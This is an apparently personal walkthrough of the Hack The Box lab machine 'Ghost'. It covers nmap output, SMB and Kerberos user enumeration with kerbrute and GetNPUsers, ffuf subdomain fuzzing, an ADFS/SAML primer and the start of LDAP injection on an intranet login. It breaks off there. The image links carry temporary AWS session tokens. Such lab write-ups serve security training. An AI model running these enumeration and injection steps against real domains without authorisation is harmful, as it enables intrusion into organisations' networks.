---
techniques:
  - "ADFS"
  - "forests"
  - "GoldenTicket"
  - "LDAPi"
  - "MSSQL"
difficulty: "Insane"
status: "Rooted"
os: "Windows"
season: "HTB"
name: "Ghost"
title: "Ghost"
notion_id: "3810f091-be70-8096-93a3-c2f0f9ca5973"
last_synced: "2026-07-08T00:49:57.623Z"
---

## Recon

<details>
<summary>Nmap</summary>

```bash
…/labs/ghost 10.10.17.85 ❯ sudo nmap -sC -sV -T4 $DC
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-17 21:09 +0100
Nmap scan report for 10.129.231.105
Host is up (0.11s latency).
Not shown: 981 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-17 20:09:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.231.105:1433: 
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-06-17T20:11:22+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-06-17T19:24:21
|_Not valid after:  2056-06-17T19:24:21
| ms-sql-info: 
|   10.129.231.105:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2026-06-16T19:21:30
|_Not valid after:  2026-12-16T19:21:30
|_ssl-date: 2026-06-17T20:11:23+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: GHOST
|   NetBIOS_Domain_Name: GHOST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ghost.htb
|   DNS_Computer_Name: DC01.ghost.htb
|   DNS_Tree_Name: ghost.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-17T20:10:41+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8008/tcp open  http          nginx 1.18.0 (Ubuntu)
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Ghost
|_http-generator: Ghost 5.78
8443/tcp open  ssl/http      nginx 1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| http-title: Ghost Core
|_Requested resource was /login
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-time: 
|   date: 2026-06-17T20:10:45
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.98 seconds
```


</details>

<details>
<summary>Web / Service Enumeration</summary>

Notes here.


</details>


---


## Initial Access


at first glance, we can see that there is a subdomain with an SSL certificate on port 8443, and ghost CMS at port 8008


Null sessions we’re enabled on SMB/LDAP, so the webservices were our only option


```bash
…/labs/ghost 10.10.17.85 3s ❯ nxc smb $DC -u 'guest' -p '' 
SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.105  445    DC01             [-] ghost.htb\guest: STATUS_ACCOUNT_DISABLED
```


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/41066d4a-f1d7-4c8f-bb85-c9dde97b29f4/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46643QCKPH6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnRk8wCCVEwDOWuupRF5SM02ggOmXGze%2Bap9fRNDp6SQIgEqgEDxDcm5JzNXWoDjijMiW6bdww9fR1NkV24AOoe7Eq%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDFQDmwT3kkoew8DMoCrcA6UGzsDjZu%2BRo5VxXoNHA7%2FGVXHxsJWhaavo5rtmqES1yIgvfKI66XVEeK5cuf%2Fcsn5KKsZsWAsPofb6C8717EM3MWYzEedC6oCwCiNFMV%2Fe6poJ9%2FQFzVlzK6DmhR2zzm8xbxLoQ2K%2BmczrbDvwvux7LrYHZYXQj4V5qe7yAICtlqTLwT6lxknggkT6nZnfQNVz0viOFCUpan%2F2hAHZ498XXZOR0Q0Z9hCnpRcXNKSXgkx9OCdwpBEirt%2FfkRZmvUvcdyjXev85ZOkW2VPHOpnIAP8nXb4xBGJcia%2Ba6cbhqqmbhtEvqI%2FyDN%2BRzsCMwnq4JZvOf6F8f%2F8q%2F1LyzI6hkrBsLVSaNxgCWL%2F%2BEB7XTA7FxpRoB9tGyVkA%2BYH6uv%2B2bCW1HdnQdxy3KnL8fcueGoFbNRbe%2B1xfl9rtXdBzj0G8SuZhv%2FMBoLkMKBMGXlMyZjkx9ySJH4D5LCqzvTvMYYdNYJklrdmIj7Pln7LUeLxIDQxC8Oj3lc8AIyca8BSntwpMI%2FKTT9WU7yaISFiPmyj%2FCQhUvD4CK8CKRT0xj%2FQhClWg1mDIGwe39KQYOYqmp%2BWvXZxLW7hSVsFlKiKUm89JC%2B%2Bg6oU9kga38P6yXMwm7r832yzPPF4qMPqfttIGOqUB%2BbbEp2ejt0uxBS7jcjidkZK3MhFz32h6ZM%2F0v3aw8rKS7f9qrSVyJ5V1TT%2BLP8QFbU2%2F2SATNIFzA0KFNDM%2FvtvWoD%2BNmhOwDmfXZSTy6dK23fjNZDsbrDUL%2BUtfWmxswj%2BeLt%2FTRpMQFhGld4Ut7Z7g3O%2BpYlWtHr3h1Riu6rSd5ihNbUPfXBzAJfXR4eGHLED9f2Dtj9aUmzmQgWLM0b%2FGOxta&X-Amz-Signature=625bbace2824cf1ca0935612a26393671a27802d2516cb300f83a3efd911b4da&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


core.ghost.htb tells us ADFS is deployed, so keep that in mind, for now, ill enumerate the ghost CMS, given its using an older version `Ghost 5.78` , maybe we can find a CVE.


before moving forward, i went and did a little research about ADFS, the authentication flow, and the attack surface


[https://www.hunters.security/en/blog/adfs-threat-hunting](https://www.hunters.security/en/blog/adfs-threat-hunting)


**Active Directory Federation Services (ADFS)** is a Microsoft identity federation solution that enables **Single Sign-On (SSO)** across organizational boundaries using standard protocols like SAML 2.0, OAuth 2.0, and WS-Federation.


---


### Core Concepts

- **Identity Provider (IdP):** ADFS itself. It authenticates users against Active Directory and issues security tokens.
- **Service Provider (SP):** The application that wants to know who the user is, but delegates authentication to ADFS.
- **Claims:** Assertions about the user (username, email, group memberships, roles) that ADFS packages into the token.
- **Token Signing Certificate:** An X.509 cert whose private key ADFS uses to sign tokens. SPs trust assertions signed by the corresponding public key.

---


### SAML 2.0 SP-Initiated Flow


```bash
`1. User accesses the SP (web app)
2. SP generates a SAMLRequest and redirects user to ADFS
3. ADFS presents a login page
4. User authenticates with domain credentials
5. ADFS validates against Active Directory
6. ADFS builds a signed SAML Assertion containing claims
7. ADFS POST's the assertion to the SP's ACS URL
8. SP validates the signature, reads claims, creates session`
```


---


### The SAML Assertion


The core artifact, an XML document containing:


```bash
`<Assertion>
  <Issuer>https://federation.example.com</Issuer>
  <Subject>
    <NameID>user@example.com</NameID>
  </Subject>
  <Conditions NotBefore="..." NotOnOrAfter="..."/>
  <AttributeStatement>
    <Attribute Name="group">
      <AttributeValue>Admins</AttributeValue>
    </Attribute>
  </AttributeStatement>
  <Signature>...</Signature>
</Assertion>`
```


---


### Trust Model


The entire security model rests on the **token signing certificate**. The SP only trusts assertions signed by the ADFS private key, verified using the public cert shared during federation metadata exchange (`/federationmetadata/2007-06/federationmetadata.xml`).


---


when clicking login with AD Federation, it takes us to Federation.ghost.htb with this SAML Token


```xml
<?xml version="1.0"?>
<samlp:AuthnRequest
  xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  ID="_2c2f7531a3bedffa39776d883c34ef47b527b95c"
  Version="2.0"
  IssueInstant="2026-06-18T19:26:54.668Z"
  ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
  Destination="https://federation.ghost.htb/adfs/ls/"
  AssertionConsumerServiceURL="https://core.ghost.htb:8443/adfs/saml/postResponse">

  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    https://core.ghost.htb:8443
  </saml:Issuer>

  <samlp:NameIDPolicy
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    AllowCreate="true"/>

  <samlp:RequestedAuthnContext
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    Comparison="exact">
    <saml:AuthnContextClassRef xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
      urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
    </saml:AuthnContextClassRef>
  </samlp:RequestedAuthnContext>

</samlp:AuthnRequest>
```


looks like a standard SSO req, nothing particularly vulnerable, looks like we’ll need creds for this one 


we’ll have to rollback to Ghost CMS for now, ADFS is a dead end for now


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/5310454c-1068-4705-9b14-f9687b1807fd/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46643QCKPH6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnRk8wCCVEwDOWuupRF5SM02ggOmXGze%2Bap9fRNDp6SQIgEqgEDxDcm5JzNXWoDjijMiW6bdww9fR1NkV24AOoe7Eq%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDFQDmwT3kkoew8DMoCrcA6UGzsDjZu%2BRo5VxXoNHA7%2FGVXHxsJWhaavo5rtmqES1yIgvfKI66XVEeK5cuf%2Fcsn5KKsZsWAsPofb6C8717EM3MWYzEedC6oCwCiNFMV%2Fe6poJ9%2FQFzVlzK6DmhR2zzm8xbxLoQ2K%2BmczrbDvwvux7LrYHZYXQj4V5qe7yAICtlqTLwT6lxknggkT6nZnfQNVz0viOFCUpan%2F2hAHZ498XXZOR0Q0Z9hCnpRcXNKSXgkx9OCdwpBEirt%2FfkRZmvUvcdyjXev85ZOkW2VPHOpnIAP8nXb4xBGJcia%2Ba6cbhqqmbhtEvqI%2FyDN%2BRzsCMwnq4JZvOf6F8f%2F8q%2F1LyzI6hkrBsLVSaNxgCWL%2F%2BEB7XTA7FxpRoB9tGyVkA%2BYH6uv%2B2bCW1HdnQdxy3KnL8fcueGoFbNRbe%2B1xfl9rtXdBzj0G8SuZhv%2FMBoLkMKBMGXlMyZjkx9ySJH4D5LCqzvTvMYYdNYJklrdmIj7Pln7LUeLxIDQxC8Oj3lc8AIyca8BSntwpMI%2FKTT9WU7yaISFiPmyj%2FCQhUvD4CK8CKRT0xj%2FQhClWg1mDIGwe39KQYOYqmp%2BWvXZxLW7hSVsFlKiKUm89JC%2B%2Bg6oU9kga38P6yXMwm7r832yzPPF4qMPqfttIGOqUB%2BbbEp2ejt0uxBS7jcjidkZK3MhFz32h6ZM%2F0v3aw8rKS7f9qrSVyJ5V1TT%2BLP8QFbU2%2F2SATNIFzA0KFNDM%2FvtvWoD%2BNmhOwDmfXZSTy6dK23fjNZDsbrDUL%2BUtfWmxswj%2BeLt%2FTRpMQFhGld4Ut7Z7g3O%2BpYlWtHr3h1Riu6rSd5ihNbUPfXBzAJfXR4eGHLED9f2Dtj9aUmzmQgWLM0b%2FGOxta&X-Amz-Signature=29cdab2b81a2a0e42acd3abe84a977cfc0eb21da53916dae7fba1c3503befbc1&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


althought the admin panel here is also stuck behind a login page, we can find a single page that has an author `Kathryn Holland` , lets build a userlist out of that


```bash
kathryn.holland
k.holland
kholland
holland.kathryn
kathryn
kholland
```


then check with kerbrute


```bash
…/labs/ghost 10.10.17.85 ❯ kerbrute userenum --dc $DC -d ghost.htb users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/18/26 - Ronnie Flathers @ropnop

2026/06/18 23:50:19 >  Using KDC(s):
2026/06/18 23:50:19 >  	10.129.231.105:88

2026/06/18 23:50:19 >  [+] VALID USERNAME:	kathryn.holland@ghost.htb
2026/06/18 23:50:19 >  Done! Tested 6 usernames (1 valid) in 0.279 seconds
```


and we got a HIT!

> Username `kathryn.holland` 

```bash
…/labs/ghost 10.10.17.85 ❯ GetNPUsers.py ghost.htb/ -usersfile users.txt -dc-ip $DC -no-pass
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] User kathryn.holland doesn't have UF_DONT_REQUIRE_PREAUTH set
```


AS-REP roasting didn’t work, i wonder what we can do with a username only


got stuck on this part for quite a bit, as nothing seemed like the right way, so i took a step back and went for subdomain enumeration, there could be more to it 


```bash
…/labs/ghost 10.10.17.85 3s ❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt   -u http://ghost.htb:8008 -H "Host: FUZZ.ghost.htb" -fw 1423

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://ghost.htb:8008
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.ghost.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1423
________________________________________________

intranet                [Status: 307, Size: 3968, Words: 52, Lines: 1, Duration: 259ms]
gitea                   [Status: 200, Size: 13652, Words: 1050, Lines: 272, Duration: 367ms]
:: Progress: [5000/5000] :: Job [1/1] :: 36 req/sec :: Duration: [0:03:09] :: Errors: 0 ::
```


okey, great, we have a dozen subdomains on our hands


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/8690b168-6474-4069-ac85-d3c9ec3fb4b6/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46643QCKPH6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnRk8wCCVEwDOWuupRF5SM02ggOmXGze%2Bap9fRNDp6SQIgEqgEDxDcm5JzNXWoDjijMiW6bdww9fR1NkV24AOoe7Eq%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDFQDmwT3kkoew8DMoCrcA6UGzsDjZu%2BRo5VxXoNHA7%2FGVXHxsJWhaavo5rtmqES1yIgvfKI66XVEeK5cuf%2Fcsn5KKsZsWAsPofb6C8717EM3MWYzEedC6oCwCiNFMV%2Fe6poJ9%2FQFzVlzK6DmhR2zzm8xbxLoQ2K%2BmczrbDvwvux7LrYHZYXQj4V5qe7yAICtlqTLwT6lxknggkT6nZnfQNVz0viOFCUpan%2F2hAHZ498XXZOR0Q0Z9hCnpRcXNKSXgkx9OCdwpBEirt%2FfkRZmvUvcdyjXev85ZOkW2VPHOpnIAP8nXb4xBGJcia%2Ba6cbhqqmbhtEvqI%2FyDN%2BRzsCMwnq4JZvOf6F8f%2F8q%2F1LyzI6hkrBsLVSaNxgCWL%2F%2BEB7XTA7FxpRoB9tGyVkA%2BYH6uv%2B2bCW1HdnQdxy3KnL8fcueGoFbNRbe%2B1xfl9rtXdBzj0G8SuZhv%2FMBoLkMKBMGXlMyZjkx9ySJH4D5LCqzvTvMYYdNYJklrdmIj7Pln7LUeLxIDQxC8Oj3lc8AIyca8BSntwpMI%2FKTT9WU7yaISFiPmyj%2FCQhUvD4CK8CKRT0xj%2FQhClWg1mDIGwe39KQYOYqmp%2BWvXZxLW7hSVsFlKiKUm89JC%2B%2Bg6oU9kga38P6yXMwm7r832yzPPF4qMPqfttIGOqUB%2BbbEp2ejt0uxBS7jcjidkZK3MhFz32h6ZM%2F0v3aw8rKS7f9qrSVyJ5V1TT%2BLP8QFbU2%2F2SATNIFzA0KFNDM%2FvtvWoD%2BNmhOwDmfXZSTy6dK23fjNZDsbrDUL%2BUtfWmxswj%2BeLt%2FTRpMQFhGld4Ut7Z7g3O%2BpYlWtHr3h1Riu6rSd5ihNbUPfXBzAJfXR4eGHLED9f2Dtj9aUmzmQgWLM0b%2FGOxta&X-Amz-Signature=6a681a908211d47f489d64644f140a3cd07a33125d55ebd625b9e0aa045c81bf&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


yet another login form, crazy, lets check gitea


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/516462c6-223f-4008-894f-73ce5441c38f/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46643QCKPH6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnRk8wCCVEwDOWuupRF5SM02ggOmXGze%2Bap9fRNDp6SQIgEqgEDxDcm5JzNXWoDjijMiW6bdww9fR1NkV24AOoe7Eq%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDFQDmwT3kkoew8DMoCrcA6UGzsDjZu%2BRo5VxXoNHA7%2FGVXHxsJWhaavo5rtmqES1yIgvfKI66XVEeK5cuf%2Fcsn5KKsZsWAsPofb6C8717EM3MWYzEedC6oCwCiNFMV%2Fe6poJ9%2FQFzVlzK6DmhR2zzm8xbxLoQ2K%2BmczrbDvwvux7LrYHZYXQj4V5qe7yAICtlqTLwT6lxknggkT6nZnfQNVz0viOFCUpan%2F2hAHZ498XXZOR0Q0Z9hCnpRcXNKSXgkx9OCdwpBEirt%2FfkRZmvUvcdyjXev85ZOkW2VPHOpnIAP8nXb4xBGJcia%2Ba6cbhqqmbhtEvqI%2FyDN%2BRzsCMwnq4JZvOf6F8f%2F8q%2F1LyzI6hkrBsLVSaNxgCWL%2F%2BEB7XTA7FxpRoB9tGyVkA%2BYH6uv%2B2bCW1HdnQdxy3KnL8fcueGoFbNRbe%2B1xfl9rtXdBzj0G8SuZhv%2FMBoLkMKBMGXlMyZjkx9ySJH4D5LCqzvTvMYYdNYJklrdmIj7Pln7LUeLxIDQxC8Oj3lc8AIyca8BSntwpMI%2FKTT9WU7yaISFiPmyj%2FCQhUvD4CK8CKRT0xj%2FQhClWg1mDIGwe39KQYOYqmp%2BWvXZxLW7hSVsFlKiKUm89JC%2B%2Bg6oU9kga38P6yXMwm7r832yzPPF4qMPqfttIGOqUB%2BbbEp2ejt0uxBS7jcjidkZK3MhFz32h6ZM%2F0v3aw8rKS7f9qrSVyJ5V1TT%2BLP8QFbU2%2F2SATNIFzA0KFNDM%2FvtvWoD%2BNmhOwDmfXZSTy6dK23fjNZDsbrDUL%2BUtfWmxswj%2BeLt%2FTRpMQFhGld4Ut7Z7g3O%2BpYlWtHr3h1Riu6rSd5ihNbUPfXBzAJfXR4eGHLED9f2Dtj9aUmzmQgWLM0b%2FGOxta&X-Amz-Signature=0b20743163357e7f5ed28b13df991f06d83170b43c087440aae90a6af03a6144&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


it looks like we don’t have much to look at as unauthenticated users, just the users list


going back to the intranet login page, it seems interesting because the UI is sort of random, so it must be vulnerable


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/2b6859e7-fc1b-4368-b0e7-ed53e3d8b8a0/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46643QCKPH6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnRk8wCCVEwDOWuupRF5SM02ggOmXGze%2Bap9fRNDp6SQIgEqgEDxDcm5JzNXWoDjijMiW6bdww9fR1NkV24AOoe7Eq%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDFQDmwT3kkoew8DMoCrcA6UGzsDjZu%2BRo5VxXoNHA7%2FGVXHxsJWhaavo5rtmqES1yIgvfKI66XVEeK5cuf%2Fcsn5KKsZsWAsPofb6C8717EM3MWYzEedC6oCwCiNFMV%2Fe6poJ9%2FQFzVlzK6DmhR2zzm8xbxLoQ2K%2BmczrbDvwvux7LrYHZYXQj4V5qe7yAICtlqTLwT6lxknggkT6nZnfQNVz0viOFCUpan%2F2hAHZ498XXZOR0Q0Z9hCnpRcXNKSXgkx9OCdwpBEirt%2FfkRZmvUvcdyjXev85ZOkW2VPHOpnIAP8nXb4xBGJcia%2Ba6cbhqqmbhtEvqI%2FyDN%2BRzsCMwnq4JZvOf6F8f%2F8q%2F1LyzI6hkrBsLVSaNxgCWL%2F%2BEB7XTA7FxpRoB9tGyVkA%2BYH6uv%2B2bCW1HdnQdxy3KnL8fcueGoFbNRbe%2B1xfl9rtXdBzj0G8SuZhv%2FMBoLkMKBMGXlMyZjkx9ySJH4D5LCqzvTvMYYdNYJklrdmIj7Pln7LUeLxIDQxC8Oj3lc8AIyca8BSntwpMI%2FKTT9WU7yaISFiPmyj%2FCQhUvD4CK8CKRT0xj%2FQhClWg1mDIGwe39KQYOYqmp%2BWvXZxLW7hSVsFlKiKUm89JC%2B%2Bg6oU9kga38P6yXMwm7r832yzPPF4qMPqfttIGOqUB%2BbbEp2ejt0uxBS7jcjidkZK3MhFz32h6ZM%2F0v3aw8rKS7f9qrSVyJ5V1TT%2BLP8QFbU2%2F2SATNIFzA0KFNDM%2FvtvWoD%2BNmhOwDmfXZSTy6dK23fjNZDsbrDUL%2BUtfWmxswj%2BeLt%2FTRpMQFhGld4Ut7Z7g3O%2BpYlWtHr3h1Riu6rSd5ihNbUPfXBzAJfXR4eGHLED9f2Dtj9aUmzmQgWLM0b%2FGOxta&X-Amz-Signature=6bfdafbbe6c8739070c1f75d187ea5f2db2b68855d22d992c1dfd4611d6cfc6f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


looking at it on burp, it looks like its using ldap authentification directly, so maybe we can inject something


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/4c3f1694-ce9f-4604-a528-ee7a60f9db67/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46643QCKPH6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnRk8wCCVEwDOWuupRF5SM02ggOmXGze%2Bap9fRNDp6SQIgEqgEDxDcm5JzNXWoDjijMiW6bdww9fR1NkV24AOoe7Eq%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDFQDmwT3kkoew8DMoCrcA6UGzsDjZu%2BRo5VxXoNHA7%2FGVXHxsJWhaavo5rtmqES1yIgvfKI66XVEeK5cuf%2Fcsn5KKsZsWAsPofb6C8717EM3MWYzEedC6oCwCiNFMV%2Fe6poJ9%2FQFzVlzK6DmhR2zzm8xbxLoQ2K%2BmczrbDvwvux7LrYHZYXQj4V5qe7yAICtlqTLwT6lxknggkT6nZnfQNVz0viOFCUpan%2F2hAHZ498XXZOR0Q0Z9hCnpRcXNKSXgkx9OCdwpBEirt%2FfkRZmvUvcdyjXev85ZOkW2VPHOpnIAP8nXb4xBGJcia%2Ba6cbhqqmbhtEvqI%2FyDN%2BRzsCMwnq4JZvOf6F8f%2F8q%2F1LyzI6hkrBsLVSaNxgCWL%2F%2BEB7XTA7FxpRoB9tGyVkA%2BYH6uv%2B2bCW1HdnQdxy3KnL8fcueGoFbNRbe%2B1xfl9rtXdBzj0G8SuZhv%2FMBoLkMKBMGXlMyZjkx9ySJH4D5LCqzvTvMYYdNYJklrdmIj7Pln7LUeLxIDQxC8Oj3lc8AIyca8BSntwpMI%2FKTT9WU7yaISFiPmyj%2FCQhUvD4CK8CKRT0xj%2FQhClWg1mDIGwe39KQYOYqmp%2BWvXZxLW7hSVsFlKiKUm89JC%2B%2Bg6oU9kga38P6yXMwm7r832yzPPF4qMPqfttIGOqUB%2BbbEp2ejt0uxBS7jcjidkZK3MhFz32h6ZM%2F0v3aw8rKS7f9qrSVyJ5V1TT%2BLP8QFbU2%2F2SATNIFzA0KFNDM%2FvtvWoD%2BNmhOwDmfXZSTy6dK23fjNZDsbrDUL%2BUtfWmxswj%2BeLt%2FTRpMQFhGld4Ut7Z7g3O%2BpYlWtHr3h1Riu6rSd5ihNbUPfXBzAJfXR4eGHLED9f2Dtj9aUmzmQgWLM0b%2FGOxta&X-Amz-Signature=c68453a2e3621bdde7a33cb0b83c3e9d1de1b54c5128ffce51c0a8938106ae95&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


and it worked!!, lets check on the browser
